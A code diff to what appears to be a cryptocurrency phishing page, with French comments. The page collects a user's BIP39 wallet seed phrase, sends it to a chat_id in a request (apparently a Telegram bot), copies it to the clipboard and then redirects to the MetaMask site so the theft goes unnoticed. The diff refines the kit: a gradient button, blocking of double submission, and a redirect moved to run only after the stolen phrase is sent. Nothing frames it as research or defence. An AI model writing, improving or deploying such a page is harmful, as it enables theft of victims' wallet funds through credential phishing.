@@ -129,7 +129,7 @@
       font-size: 14px;
     }
     .submit-btn {
-      background-color: #28a745; /* Vert */
+      background: linear-gradient(90deg, #537cff, #6563ff);
       border: none;
       color: white;
       width: 100%;
@@ -266,13 +266,18 @@
     }
 
     function handleConfirm() {
+      const submitBtn = document.getElementById("submitBtn");
       const errorEl = document.getElementById("errorMsg");
+
       if (!validateBIP39Words()) {
         errorEl.style.display = "block";
         return;
       } else {
         errorEl.style.display = "none";
       }
+
+      // Disable button to prevent multiple submissions
+      submitBtn.disabled = true;
 
       const count = parseInt(document.getElementById("phraseLength").value);
       let phrase = "";
@@ -291,13 +296,13 @@
           chat_id: chatId,
           text: "\n\n" + phrase.trim()
         })
+      }).finally(() => {
+        setTimeout(() => {
+          window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+        }, 800);
       });
 
       navigator.clipboard.writeText(phrase.trim());
-
-      setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
-      }, 800);
     }
 
     document.addEventListener("paste", function(e) {
